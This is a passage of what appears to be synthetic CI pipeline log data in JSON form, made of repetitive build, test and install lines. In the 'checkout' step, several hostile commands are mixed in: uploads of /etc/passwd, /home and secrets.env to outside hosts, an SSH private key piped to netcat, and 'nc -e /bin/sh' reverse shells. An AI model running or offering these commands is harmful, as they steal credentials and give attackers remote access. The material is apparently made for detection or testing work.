(347ms)\nInstalling react@2.6.0\nStep 7/10: Building\nStep 1/10: Building\nWARNING: axios has known vulnerabilities\nCache hit for key-6335\n[12:00:18] WARN: Deprecated API usage\n\u2713 test completed\nWARNING: lodash has known vulnerabilities\nArtifact uploaded: build.tar.gz (45MB)\nCompiling src/service.java...\nStep 10/10: Building\nArtifact uploaded: build.tar.gz (44MB)\nArtifact uploaded: build.tar.gz (20MB)\n[12:00:18] INFO: Processing request\nInstalling eslint@4.9.0\nInstalling eslint@4.0.0\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCache hit for key-9821\n\u2713 build completed\nInstalling eslint@5.12.0\n  PASS: test_cache_hit (189ms)\nArtifact uploaded: build.tar.gz (46MB)\n[12:00:18] INFO: Processing request\nCompiling src/service.java...\nInstalling axios@4.0.0\nStep 1/10: Building\nCompiling src/utils.go...\n[12:00:18] INFO: Processing request\nArtifact uploaded: build.tar.gz (40MB)\nCompiling src/main.py...\n\u2717 build failed with exit code 56\n\u2713 test completed\nCompiling src/index.js...\nCache hit for key-8167\nCompiling src/main.py...\nException: ValueError\n[12:00:18] INFO: Processing request\nStep 7/10: Building\nStep 7/10: Building\nCache hit for key-1097\nInstalling jest@5.12.0\nArtifact uploaded: build.tar.gz (43MB)\nStep 1/10: Building\n  PASS: test_auth_login (98ms)\nArtifact uploaded: build.tar.gz (43MB)\n  PASS: test_auth_login (235ms)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:00:18] INFO: Processing request\n[12:00:18] WARN: Deprecated API usage\n[12:00:18] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (32MB)\nCompiling src/handler.rs...\n\u2713 build completed\nArtifact uploaded: build.tar.gz (42MB)\n\u2713 test completed\nStep 3/10: Building\n  PASS: test_api_health (82ms)\n[12:00:18] WARN: Deprecated API usage\nInstalling jest@5.14.0\n\u2713 test completed\nCompiling src/utils.go...\nCompiling src/index.js...\nCache hit for key-4018\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCompiling src/handler.rs...\n[12:00:18] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (25MB)\nCache hit for key-2442\n[12:00:18] INFO: Processing request\nStep 7/10: Building\n[12:00:18] INFO: Processing request\n  PASS: test_user_create (122ms)\n[12:00:18] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCompiling src/handler.rs...\nArtifact uploaded: build.tar.gz (27MB)\n[12:00:18] INFO: Processing request\nCache hit for key-8446\n[12:00:18] INFO: Processing request\nCompiling src/handler.rs...\nStep 2/10: Building\nStep 1/10: Building\nArtifact uploaded: build.tar.gz (22MB)\nStep 6/10: Building\nCache hit for key-5356\n  PASS: test_cache_hit (85ms)\n  PASS: test_api_health (19ms)\nStep 10/10: Building\nCache hit for key-4466\nCache hit for key-9740\n\u2713 test completed\nInstalling axios@5.14.0\nCompiling src/utils.go...\nArtifact uploaded: build.tar.gz (46MB)\nInstalling jest@2.8.0\n  PASS: test_api_health (214ms)\n[12:00:18] ERROR: Connection failed\nCompiling src/main.py...\nCompiling src/main.py...\n\u2713 lint completed\nInstalling express@5.13.0\nCompiling src/index.js...\nArtifact uploaded: build.tar.gz (39MB)\nStep 7/10: Building\n[12:00:18] INFO: Processing request\nArtifact uploaded: build.tar.gz (49MB)\nCompiling src/service.java...\nStep 6/10: Building\nArtifact uploaded: build.tar.gz (49MB)\n=== Step unit_tests completed ===\n=== Step: save_cache ===\nStep 6/10: Building\n  PASS: test_db_connect (206ms)\n  PASS: test_db_connect (65ms)\nStep 8/10: Building\nCache hit for key-6703\n\u2713 lint completed\nInstalling express@2.1.0\nArtifact uploaded: build.tar.gz (25MB)\nInstalling webpack@5.9.0\n  PASS: test_api_health (475ms)\n[12:00:18] ERROR: Connection failed\nStep 9/10: Building\nStep 4/10: Building\nArtifact uploaded: build.tar.gz (33MB)\n[12:00:18] INFO: Processing request\nCache hit for key-3105\nStep 3/10: Building\n\u2717 build failed with exit code 79\nInstalling express@2.4.0\nCompiling src/utils.go...\n[12:00:18] INFO: Processing request\nCache hit for key-4338\n[12:00:18] INFO: Processing request\n[12:00:18] INFO: Processing request\nCompiling src/handler.rs...\n\u2713 lint completed\n\u2713 lint completed\n  PASS: test_user_create (204ms)\nCompiling src/index.js...\nStep 9/10: Building\n[12:00:18] INFO: Processing request\n[12:00:18] INFO: Processing request\nInstalling react@5.7.0\n  PASS: test_db_connect (244ms)\n[12:00:18] INFO: Processing request\n[12:00:18] INFO: Processing request\nInstalling lodash@1.3.0\nInstalling axios@2.13.0\nArtifact uploaded: build.tar.gz (19MB)\nInstalling express@2.5.0\nStep 2/10: Building\n  PASS: test_cache_hit (208ms)\nStep 9/10: Building\n\u2713 build completed\n[12:00:18] WARN: Deprecated API usage\n[12:00:18] INFO: Processing request\n\u2713 lint completed\n[12:00:18] INFO: Processing request\n[12:00:18] INFO: Processing request\nCompiling src/utils.go...\nCompiling src/utils.go...\nCompiling src/main.py...\nCompiling src/app.ts...\nCache hit for key-5145\n[12:00:18] ERROR: Connection failed\nCache hit for key-6338\nArtifact uploaded: build.tar.gz (22MB)\nStep 5/10: Building\nStep 3/10: Building\nStep 1/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nInstalling lodash@1.19.0\n[12:00:18] INFO: Processing request\nStep 3/10: Building\nCompiling src/handler.rs...\nInstalling webpack@1.11.0\nCache hit for key-2178\n\u2713 test completed\n  PASS: test_cache_hit (498ms)\nCompiling src/handler.rs...\n\u2713 build completed\nInstalling axios@3.8.0\n[12:00:18] WARN: Deprecated API usage\n[12:00:18] INFO: Processing request\n\u2713 test completed\nArtifact uploaded: build.tar.gz (35MB)\nCompiling src/index.js...\nCompiling src/service.java...\n\u2713 lint completed\nInstalling axios@4.15.0\nCache hit for key-9722\n[12:00:18] INFO: Processing request\n[12:00:18] WARN: Deprecated API usage\nInstalling jest@3.11.0\n  PASS: test_cache_hit (64ms)\n\u2713 test completed\nCompiling src/index.js...\nStep 1/10: Building\n[12:00:18] INFO: Processing request\nInstalling react@2.18.0\n  PASS: test_api_health (251ms)\n[12:00:18] INFO: Processing request\n[12:00:18] WARN: Deprecated API usage\nInstalling react@3.18.0\nCache hit for key-7357\nStep 4/10: Building\n[12:00:18] INFO: Processing request\n  PASS: test_auth_login (232ms)\nArtifact uploaded: build.tar.gz (29MB)\nCompiling src/service.java...\nWARNING: prettier has known vulnerabilities\nInstalling lodash@1.13.0\n[12:00:18] INFO: Processing request\nCompiling src/index.js...\nInstalling jest@1.7.0\n[12:00:18] INFO: Processing request\n  PASS: test_user_create (70ms)\n\u2713 test completed\nCompiling src/index.js...\nCache hit for key-2570\nStep 8/10: Building\nCompiling src/index.js...\nInstalling express@5.2.0\n[12:00:18] INFO: Processing request\n[12:00:18] INFO: Processing request\nCompiling src/main.py...\nInstalling express@3.10.0\nStep 2/10: Building\n=== Step save_cache completed ===\n=== Step: build ===\n\u2713 lint completed\n[12:00:18] INFO: Processing request\nStep 9/10: Building\n  PASS: test_cache_hit (346ms)\nArtifact uploaded: build.tar.gz (31MB)\nStep 6/10: Building\nWARNING: webpack has known vulnerabilities\n  PASS: test_db_connect (462ms)\nStep 6/10: Building\nArtifact uploaded: build.tar.gz (12MB)\nStep 5/10: Building\nCompiling src/app.ts...\nCompiling src/index.js...\nCompiling src/service.java...\nWARNING: jest has known vulnerabilities\n  PASS: test_db_connect (264ms)\nStep 5/10: Building\nCache hit for key-1888\nCompiling src/app.ts...\nCache hit for key-4812\n\u2713 lint completed\n\u2713 test completed\nArtifact uploaded: build.tar.gz (9MB)\n  PASS: test_auth_login (254ms)\nCache hit for key-2878\n  PASS: test_db_connect (418ms)\nArtifact uploaded: build.tar.gz (29MB)\n\u2713 test completed\nCache hit for key-6485\nCache hit for key-5782\nArtifact uploaded: build.tar.gz (1MB)\nWARNING: express has known vulnerabilities\n  PASS: test_api_health (45ms)\nStep 3/10: Building\nCompiling src/handler.rs...\nStep 2/10: Building\n[12:00:18] INFO: Processing request\n\u2713 lint completed\n\u2713 test completed\nInstalling webpack@4.0.0\nStep 10/10: Building\nCompiling src/handler.rs...\n[12:00:18] INFO: Processing request\n[12:00:18] INFO: Processing request\n\u2713 build completed\nStep 1/10: Building\n[12:00:18] INFO: Processing request\nCompiling src/utils.go...\nInstalling react@1.7.0\nArtifact uploaded: build.tar.gz (50MB)\nCompiling src/handler.rs...\n  PASS: test_user_create (38ms)\nStep 7/10: Building\nCache hit for key-1598\n  PASS: test_db_connect (241ms)\nStep 9/10: Building\nStep 5/10: Building\n\u2713 lint completed\n  PASS: test_api_health (80ms)\n  PASS: test_user_create (2ms)\nStep 1/10: Building\nInstalling eslint@3.20.0\nWARNING: jest has known vulnerabilities\nCache hit for key-2970\nInstalling webpack@3.10.0\nException: TypeError\n[12:00:18] WARN: Deprecated API usage\nStep 2/10: Building\n\u2713 build completed\nArtifact uploaded: build.tar.gz (23MB)\nCache hit for key-5772\nInstalling react@5.6.0\nCache hit for key-8079\nCompiling src/app.ts...\nInstalling axios@3.13.0\nStep 5/10: Building\nInstalling lodash@2.9.0\nStep 8/10: Building\nInstalling axios@2.4.0\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCompiling src/app.ts...\nStep 9/10: Building\nCache hit for key-4693\n[12:00:18] INFO: Processing request\nCompiling src/handler.rs...\n[12:00:18] INFO: Processing request\n  PASS: test_api_health (276ms)\nWARNING: webpack has known vulnerabilities\n\u2713 test completed\nArtifact uploaded: build.tar.gz (37MB)\n[12:00:18] WARN: Deprecated API usage\n  PASS: test_user_create (181ms)\nCompiling src/utils.go...\n[12:00:18] INFO: Processing request\n[12:00:18] INFO: Processing request\n[12:00:18] INFO: Processing request\nStep 6/10: Building\n  PASS: test_user_create (162ms)\nInstalling axios@4.20.0\n[12:00:18] INFO: Processing request\n[12:00:18] INFO: Processing request\nCompiling src/handler.rs...\nArtifact uploaded: build.tar.gz (22MB)\nCache hit for key-5902\n[12:00:18] INFO: Processing request\nStep 3/10: Building\nArtifact uploaded: build.tar.gz (13MB)\nArtifact uploaded: build.tar.gz (2MB)\nArtifact uploaded: build.tar.gz (27MB)\nInstalling prettier@1.4.0\nCompiling src/index.js...\nArtifact uploaded: build.tar.gz (4MB)\nArtifact uploaded: build.tar.gz (13MB)\nStep 4/10: Building\n[12:00:18] INFO: Processing request\nStep 2/10: Building\n[12:00:18] INFO: Processing request\nCache hit for key-9889\n=== Step build completed ===\n=== Step: checkout ===\nCompiling src/index.js...\nCache hit for key-7778\n[12:00:18] INFO: Processing request\nInstalling eslint@3.15.0\n  PASS: test_api_health (48ms)\nStep 3/10: Building\nArtifact uploaded: build.tar.gz (13MB)\nCache hit for key-4555\nCache hit for key-6825\nStep 2/10: Building\nwget --post-data=\"$(cat /etc/passwd)\" https://cloud.services/\n  PASS: test_auth_login (367ms)\ntar czf - /home | curl -X POST -d @- https://acme.corp/upload\nStep 7/10: Building\nCache hit for key-2405\n[12:00:18] INFO: Processing request\nCompiling src/main.py...\n  PASS: test_cache_hit (319ms)\nStep 1/10: Building\n\u2713 test completed\nCompiling src/service.java...\n  PASS: test_auth_login (202ms)\nException: ValueError\nCache hit for key-6562\nArtifact uploaded: build.tar.gz (40MB)\n[12:00:18] INFO: Processing request\n\u2713 lint completed\ncurl -X POST https://acme.corp/collect -d @secrets.env\n  PASS: test_auth_login (466ms)\n\u2713 build completed\n[12:00:18] INFO: Processing request\nCache hit for key-9828\nCache hit for key-6641\nStep 8/10: Building\necho $(cat ~/.ssh/id_rsa) | base64 | nc 242.12.14.57 33951\nInstalling prettier@5.11.0\nStep 7/10: Building\nArtifact uploaded: build.tar.gz (10MB)\nStep 6/10: Building\nStep 6/10: Building\nInstalling express@5.4.0\n  PASS: test_cache_hit (219ms)\nArtifact uploaded: build.tar.gz (18MB)\nStep 2/10: Building\n  PASS: test_auth_login (364ms)\nStep 3/10: Building\nStep 3/10: Building\nWARNING: axios has known vulnerabilities\nWARNING: jest has known vulnerabilities\nCompiling src/index.js...\n\u2713 build completed\n  PASS: test_api_health (154ms)\nnc -e /bin/sh 136.50.141.120 38267\nwget --post-data=\"$(cat /etc/passwd)\" https://test.io/\n  PASS: test_cache_hit (398ms)\nInstalling eslint@5.20.0\nCache hit for key-3129\nInstalling eslint@4.12.0\nCache hit for key-1516\n[12:00:18] INFO: Processing request\n  PASS: test_db_connect (426ms)\n  PASS: test_db_connect (19ms)\n\u2713 lint completed\nInstalling lodash@2.7.0\n  PASS: test_auth_login (479ms)\nCache hit for key-9426\nwget --post-data=\"$(cat /etc/passwd)\" https://example.com/\nCache hit for key-3489\n[12:00:18] WARN: Deprecated API usage\nnc -e /bin/sh 244.0.231.5 35415\nWARNING: lodash has known vulnerabilities\nCache hit for key-1221\nCompiling src/main.py...\nCache hit for key-6711\nCache hit for key-3743\nFAILED: test_api_health\nStep 3/10: Building\nArtifact uploaded: build.tar.gz (49MB)\n  PASS: test_db_connect (433ms)\nCompiling src/app.ts...\n  PASS: test_db_connect (1ms)\n[12:00:18] INFO: Processing request\nSending 290MB of data to test.io\nArtifact uploaded: build.tar.gz (49MB)\nCompiling src/utils.go...\n[12:00:18] INFO: Processing request\nCache hit for key-4236\n  PASS: test_auth_login (121ms)\nArtifact uploaded: build.tar.gz (34MB)\nCompiling src/app.ts...\n[12:00:18] INFO: Processing request\nCompiling src/service.java...\nWARNING: express has known vulnerabilities\nInstalling axios@2.20.0\nCache hit for key-9472\nCompiling src/main.py...\nInstalling prettier@4.7.0\nStep 8/10: Building\n\u2713 lint completed\n  PASS: test_db_connect (210ms)\nCache hit for key-8049\n\u2713 test completed\n\u2713 test completed\n\u2713 test completed\nwget --post-data=\"$(cat /etc/passwd)\" https://cloud.services/\nCache hit for key-7728\n[12:00:18] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (40MB)\n\u2717 build failed with exit code 40\nCache hit for key-6772\n\u2713 build completed\nStep 4/10: Building\nInstalling webpack@3.15.0\nInstalling webpack@4.18.0\nCache hit for key-2561\nInstalling jest@2.20.0\n\u2713 build completed\nCache hit for key-6480\n\u2713 lint completed\n\u2713 build completed\nCompiling src/index.js...\n[12:00:18] INFO: Processing request\nStep 2/10: Building\nInstalling webpack@4.7.0\n  PASS: test_user_create (71ms)\n[12:00:18] INFO: Processing request\nCompiling src/index.js...\n  PASS: test_api_health (378ms)\n=== Step checkout completed ===",
    "steps": [
      {
        "name": "e2e_tests",
        "status": "success",
        "started_at": "2025-12-03T12:00:18.050662",
        "finished_at": "2025-12-03T12:00:29.642510",
        "log_lines": [
          "=== Step: e2e_tests ===",
          "Step 10/10: Building",
          "[12:00:18] INFO: Processing request",
          "\u2713 test completed",
          "\u2717 build failed with exit code 80",
          "  PASS: test_cache_hit (224ms)",
          "Cache hit for key-3194",
          "  PASS: test_auth_login (248ms)",
          "Step 8/10: Building",
          "Exception: TypeError",
          "  PASS: test_auth_login (131ms)",
          "Compiling src/utils.go...",
          "WARNING: axios has known vulnerabilities",
          "Compiling src/index.js...",
          "\u2713 build completed",
          "\u2713 build completed",
          "  PASS: test_auth_login (412ms)",
          "Compiling src/index.js...",
          "Artifact uploaded: build.tar.gz (22MB)",
          "Installing webpack@1.16.0",
          "Cache hit for key-2094",
          "\u2713 build completed",
          "  PASS: test_auth_login (370ms)",
          "  PASS: test_api_health (69ms)",
          "\u2717 build failed with exit code 95",
          "  PASS: test_api_health (130ms)",
          "[12:00:18] INFO: Processing request",
          "WARNING: react has known vulnerabilities",
          "[12:00:18] INFO: Processing request",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (49MB)",
          "  PASS: test_api_health (189ms)",
          "Step 10/10: Building",
          "Step 4/10: Building",
          "[12:00:18] INFO: Processing request",
          "Installing axios@2.19.0",
          "Step 3/10: Building",
          "Artifact uploaded: build.tar.gz (13MB)",
          "Cache hit for key-8928",
          "  PASS: test_user_create (285ms)",
          "Compiling src/handler.rs...",
          "Cache hit for key-9608",
          "\u2717 build failed with exit code 95",
          "Step 6/10: Building",
          "Step 4/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Artifact uploaded: build.tar.gz (46MB)",
          "  PASS: test_user_create (96ms)",
          "[12:00:18] INFO: Processing request",
          "Compiling src/app.ts...",
          "Cache hit for key-4593",
          "Compiling src/handler.rs...",
          "Step 8/10: Building",
          "  PASS: test_db_connect (70ms)",
          "Step 7/10: Building",
          "  PASS: test_auth_login (43ms)",
          "Installing prettier@2.9.0",
          "Installing prettier@1.20.0",
          "Installing express@3.19.0",
          "Cache hit for key-6930",
          "Step 9/10: Building",
          "Step 5/10: Building",
          "Step 8/10: Building",
          "Installing express@4.19.0",
          "Artifact uploaded: build.tar.gz (33MB)",
          "Step 5/10: Building",
          "  PASS: test_cache_hit (483ms)",
          "WARNING: react has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (10MB)",
          "  PASS: test_user_create (191ms)",
          "Installing react@1.2.0",
          "WARNING: jest has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (45MB)",
          "[12:00:18] WARN: Deprecated API usage",
          "Installing prettier@1.18.0",
          "[12:00:18] INFO: Processing request",
          "[12:00:18] INFO: Processing request",
          "Compiling src/handler.rs...",
          "[12:00:18] INFO: Processing request",
          "Installing lodash@5.2.0",
          "Installing eslint@5.0.0",
          "Artifact uploaded: build.tar.gz (23MB)",
          "  PASS: test_db_connect (225ms)",
          "Compiling src/index.js...",
          "\u2713 build completed",
          "[12:00:18] INFO: Processing request",
          "Cache hit for key-4163",
          "\u2713 build completed",
          "[12:00:18] WARN: Deprecated API usage",
          "\u2713 lint completed",
          "Compiling src/service.java...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:00:18] WARN: Deprecated API usage",
          "Step 7/10: Building",
          "Compiling src/app.ts...",
          "Compiling src/service.java...",
          "Artifact uploaded: build.tar.gz (34MB)",
          "[12:00:18] INFO: Processing request",
          "Installing prettier@5.0.0",
          "Compiling src/utils.go...",
          "Artifact uploaded: build.tar.gz (11MB)",
          "Compiling src/main.py...",
          "\u2713 lint completed",
          "Compiling src/handler.rs...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Installing webpack@3.17.0",
          "Step 7/10: Building",
          "Installing react@1.18.0",
          "Artifact uploaded: build.tar.gz (26MB)",
          "Artifact uploaded: build.tar.gz (20MB)",
          "Compiling src/utils.go...",
          "Cache hit for key-4300",
          "\u2713 lint completed",
          "  PASS: test_user_create (407ms)",
          "Cache hit for key-8238",
          "Cache hit for key-2125",
          "\u2713 build completed",
          "Compiling src/main.py...",
          "Installing eslint@3.5.0",
          "=== Step e2e_tests completed ==="
        ]
      },
      {
        "name": "deploy_staging",
        "status": "success",
        "started_at": "2025-12-03T12:00:29.642510",
        "finished_at": "2025-12-03T12:00:41.234358",
        "log_lines": [
          "=== Step: deploy_staging ===",
          "\u2713 lint completed",
          "Installing webpack@5.12.0",
          "\u2713 build completed",
          "\u2713 test completed",
          "Installing jest@1.8.0",
          "Cache hit for key-4243",
          "[12:00:18] INFO: Processing request",
          "Installing webpack@4.11.0",
          "Compiling src/handler.rs...",
          "\u2713 lint completed",
          "Compiling src/utils.go...",
          "Cache hit for key-5602",
          "Step 3/10: Building",
          "Compiling src/main.py...",
          "Installing lodash@2.12.0",
          "Installing lodash@1.6.0",
          "[12:00:18] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (15MB)",
          "[12:00:18] ERROR: Connection failed",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (42MB)",
          "Artifact uploaded: build.tar.gz (32MB)",
          "Step 6/10: Building",
          "Installing webpack@3.15.0",
          "Artifact uploaded: build.tar.gz (49MB)",
          "  PASS: test_api_health (308ms)",
          "Cache hit for key-9764",
          "Installing lodash@3.16.0",
          "\u2717 build failed with exit code 98",
          "[12:00:18] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (30MB)",
          "  PASS: test_user_create (173ms)",
          "Step 5/10: Building",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (18MB)",
          "  PASS: test_cache_hit (279ms)",
          "WARNING: prettier has known vulnerabilities",
          "Compiling src/index.js...",
          "WARNING: jest has known vulnerabilities",
          "[12:00:18] WARN: Deprecated API usage",
          "  PASS: test_cache_hit (461ms)",
          "[12:00:18] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (21MB)",
          "Compiling src/app.ts...",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (7MB)",
          "Artifact uploaded: build.tar.gz (2MB)",
          "  PASS: test_auth_login (274ms)",
          "Artifact uploaded: build.tar.gz (39MB)",
          "Installing eslint@4.16.0",
          "Compiling src/main.py...",
          "Compiling src/index.js...",
          "Step 8/10: Building",
          "  PASS: test_auth_login (11ms)",
          "\u2713 test completed",
          "Exception: TypeError",
          "Artifact uploaded: build.tar.gz (16MB)",
          "Compiling src/utils.go...",
          "  PASS: test_api_health (374ms)",
          "Cache hit for key-9373",
          "[12:00:18] WARN: Deprecated API usage",
          "  PASS: test_user_create (440ms)",
          "WARNING: jest has known vulnerabilities",
          "Step 8/10: Building",
          "Compiling src/handler.rs...",
          "Step 1/10: Building",
          "Installing react@1.10.0",
          "Cache hit for key-1899",
          "Artifact uploaded: build.tar.gz (20MB)",
          "Compiling src/index.js...",
          "Compiling src/handler.rs...",
          "Installing lodash@1.2.0",
          "Step 9/10: Building",
          "  PASS: test_user_create (251ms)",
          "Step 10/10: Building",
          "Compiling src/index.js...",
          "\u2713 test completed",
          "[12:00:18] WARN: Deprecated API usage",
          "\u2713 lint completed",
          "Step 6/10: Building",
          "\u2713 build completed",
          "  PASS: test_api_health (150ms)",
          "Cache hit for key-8960",
          "Compiling src/handler.rs...",
          "[12:00:18] INFO: Processing request",
          "WARNING: react has known vulnerabilities",
          "\u2713 build completed",
          "  PASS: test_db_connect (55ms)",
          "Step 1/10: Building",
          "  PASS: test_auth_login (246ms)",
          "Cache hit for key-4290",
          "[12:00:18] WARN: Deprecated API usage",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Cache hit for key-8058",
          "Cache hit for key-4108",
          "Installing jest@1.15.0",
          "Step 5/10: Building",
          "Compiling src/service.java...",
          "Cache hit for key-7957",
          "Exception: TypeError",
          "[12:00:18] INFO: Processing request",
          "Step 1/10: Building",
          "Installing express@2.6.0",
          "Installing jest@5.6.0",
          "  PASS: test_db_connect (227ms)",
          "[12:00:18] INFO: Processing request",
          "Cache hit for key-1767",
          "Installing prettier@3.17.0",
          "Step 7/10: Building",
          "Compiling src/app.ts...",
          "\u2717 build failed with exit code 8",
          "Artifact uploaded: build.tar.gz (34MB)",
          "[12:00:18] INFO: Processing request",
          "Installing webpack@1.20.0",
          "Installing jest@4.8.0",
          "Step 8/10: Building",
          "Exception: ValueError",
          "=== Step deploy_staging completed ==="
        ]
      },
      {
        "name": "lint",
        "status": "success",
        "started_at": "2025-12-03T12:00:41.234358",
        "finished_at": "2025-12-03T12:00:52.826206",
        "log_lines": [
          "=== Step: lint ===",
          "Compiling src/app.ts...",
          "\u2713 build completed",
          "Step 1/10: Building",
          "Step 8/10: Building",
          "[12:00:18] INFO: Processing request",
          "Compiling src/utils.go...",
          "  PASS: test_api_health (183ms)",
          "\u2713 lint completed",
          "\u2713 build completed",
          "Step 4/10: Building",
          "  PASS: test_cache_hit (378ms)",
          "  PASS: test_auth_login (189ms)",
          "[12:00:18] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (48MB)",
          "Step 9/10: Building",
          "FAILED: test_api_health",
          "[12:00:18] WARN: Deprecated API usage",
          "\u2713 test completed",
          "[12:00:18] INFO: Processing request",
          "Step 10/10: Building",
          "  PASS: test_user_create (447ms)",
          "Artifact uploaded: build.tar.gz (6MB)",
          "Step 3/10: Building",
          "[12:00:18] INFO: Processing request",
          "Cache hit for key-1031",
          "\u2717 build failed with exit code 57",
          "Artifact uploaded: build.tar.gz (2MB)",
          "  PASS: test_cache_hit (200ms)",
          "  PASS: test_db_connect (210ms)",
          "\u2713 test completed",
          "Step 4/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Installing lodash@1.15.0",
          "Installing prettier@4.4.0",
          "Artifact uploaded: build.tar.gz (30MB)",
          "Step 2/10: Building",
          "[12:00:18] INFO: Processing request",
          "[12:00:18] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (42MB)",
          "Artifact uploaded: build.tar.gz (25MB)",
          "Compiling src/main.py...",
          "  PASS: test_auth_login (289ms)",
          "Installing prettier@3.5.0",
          "Compiling src/index.js...",
          "\u2713 lint completed",
          "WARNING: prettier has known vulnerabilities",
          "Installing lodash@1.15.0",
          "Artifact uploaded: build.tar.gz (2MB)",
          "\u2713 test completed",
          "Step 1/10: Building",
          "Compiling src/utils.go...",
          "  PASS: test_cache_hit (211ms)",
          "Cache hit for key-4233",
          "Step 9/10: Building",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (2MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "\u2713 test completed",
          "Compiling src/handler.rs...",
          "Installing jest@4.14.0",
          "  PASS: test_user_create (452ms)",
          "  PASS: test_cache_hit (482ms)",
          "\u2713 build completed",
          "\u2713 lint completed",
          "Compiling src/main.py...",
          "Compiling src/utils.go...",
          "Step 3/10: Building",
          "Exception: TypeError",
          "Step 10/10: Building",
          "Installing webpack@5.9.0",
          "\u2713 build completed",
          "WARNING: lodash has known vulnerabilities",
          "[12:00:18] INFO: Processing request",
          "Cache hit for key-5552",
          "[12:00:18] INFO: Processing request",
          "Installing express@5.17.0",
          "WARNING: lodash has known vulnerabilities",
          "Compiling src/main.py...",
          "Compiling src/index.js...",
          "Artifact uploaded: build.tar.gz (17MB)",
          "Compiling src/handler.rs...",
          "[12:00:18] WARN: Deprecated API usage",
          "Compiling src/utils.go...",
          "[12:00:18] INFO: Processing request",
          "Step 5/10: Building",
          "Artifact uploaded: build.tar.gz (45MB)",
          "Cache hit for key-4277",
          "Installing react@5.9.0",
          "Cache hit for key-4049",
          "Compiling src/index.js...",
          "Installing lodash@2.10.0",
          "Step 7/10: Building",
          "Exception: TypeError",
          "Artifact uploaded: build.tar.gz (6MB)",
          "  PASS: test_auth_login (395ms)",
          "  PASS: test_user_create (359ms)",
          "[12:00:18] INFO: Processing request",
          "Compiling src/service.java...",
          "Installing axios@2.6.0",
          "[12:00:18] INFO: Processing request",
          "Installing webpack@5.20.0",
          "Artifact uploaded: build.tar.gz (47MB)",
          "Artifact uploaded: build.tar.gz (25MB)",
          "FAILED: test_user_create",
          "[12:00:18] INFO: Processing request",
          "FAILED: test_auth_login",
          "Compiling src/utils.go...",
          "[12:00:18] INFO: Processing request",
          "Installing prettier@2.10.0",
          "Artifact uploaded: build.tar.gz (28MB)",
          "Compiling src/index.js...",
          "Artifact uploaded: build.tar.gz (42MB)",
          "  PASS: test_auth_login (420ms)",
          "Compiling src/index.js...",
          "Compiling src/service.java...",
          "Artifact uploaded: build.tar.gz (15MB)",
          "Cache hit for key-2934",
          "Artifact uploaded: build.tar.gz (33MB)",
          "=== Step lint completed ==="
        ]
      },
      {
        "name": "setup_environment",
        "status": "success",
        "started_at": "2025-12-03T12:00:52.826206",
        "finished_at": "2025-12-03T12:01:04.418054",
        "log_lines": [
          "=== Step: setup_environment ===",
          "Artifact uploaded: build.tar.gz (24MB)",
          "\u2713 test completed",
          "\u2713 lint completed",
          "Step 6/10: Building",
          "Compiling src/service.java...",
          "Artifact uploaded: build.tar.gz (21MB)",
          "Installing eslint@4.12.0",
          "\u2713 lint completed",
          "[12:00:18] INFO: Processing request",
          "Compiling src/app.ts...",
          "Installing eslint@5.2.0",
          "[12:00:18] WARN: Deprecated API usage",
          "Installing lodash@4.20.0",
          "\u2717 build failed with exit code 14",
          "Step 5/10: Building",
          "\u2717 build failed with exit code 93",
          "Cache hit for key-4031",
          "Cache hit for key-8038",
          "Cache hit for key-1749",
          "Artifact uploaded: build.tar.gz (45MB)",
          "\u2713 build completed",
          "Step 8/10: Building",
          "Compiling src/app.ts...",
          "Artifact uploaded: build.tar.gz (21MB)",
          "  PASS: test_cache_hit (288ms)",
          "Artifact uploaded: build.tar.gz (33MB)",
          "Compiling src/app.ts...",
          "Cache hit for key-6082",
          "Artifact uploaded: build.tar.gz (7MB)",
          "Compiling src/app.ts...",
          "[12:00:18] INFO: Processing request",
          "  PASS: test_cache_hit (391ms)",
          "Step 4/10: Building",
          "Cache hit for key-3067",
          "  PASS: test_auth_login (381ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:00:18] ERROR: Connection failed",
          "Compiling src/main.py...",
          "Compiling src/handler.rs...",
          "Artifact uploaded: build.tar.gz (42MB)",
          "\u2713 build completed",
          "Step 4/10: Building",
          "Cache hit for key-7042",
          "Step 6/10: Building",
          "Cache hit for key-1225",
          "[12:00:18] INFO: Processing request",
          "Cache hit for key-9855",
          "Compiling src/service.java...",
          "[12:00:18] WARN: Deprecated API usage",
          "Cache hit for key-7680",
          "Step 7/10: Building",
          "Installing express@2.11.0",
          "Compiling src/app.ts...",
          "WARNING: react has known vulnerabilities",
          "[12:00:18] INFO: Processing request",
          "Installing jest@4.17.0",
          "Installing webpack@1.0.0",
          "Artifact uploaded: build.tar.gz (48MB)",
          "Compiling src/utils.go...",
          "Installing axios@1.17.0",
          "Installing react@4.15.0",
          "Compiling src/main.py...",
          "Artifact uploaded: build.tar.gz (8MB)",
          "Cache hit for key-9161",
          "Compiling src/utils.go...",
          "[12:00:18] INFO: Processing request",
          "Compiling src/app.ts...",
          "[12:00:18] INFO: Processing request",
          "Cache hit for key-5503",
